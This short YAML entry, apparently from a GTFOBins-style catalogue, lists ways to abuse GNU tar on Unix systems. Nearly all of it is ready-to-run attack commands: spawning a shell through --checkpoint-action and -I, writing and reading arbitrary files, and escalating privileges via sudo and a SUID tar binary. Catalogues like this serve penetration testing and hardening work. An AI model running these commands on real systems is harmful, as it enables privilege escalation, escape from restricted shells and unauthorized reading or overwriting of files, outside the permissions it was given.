---
functions:
  shell:
    - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    - description: This only works for GNU tar.
      code: tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
  file-write:
    - description: This only works for GNU tar.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA > "$TF"
        tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
  file-read:
    - description: This only works for GNU tar.
      code: |
        LFILE=file_to_read
        tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
  sudo:
    - code: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  limited-suid:
    - code: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
---
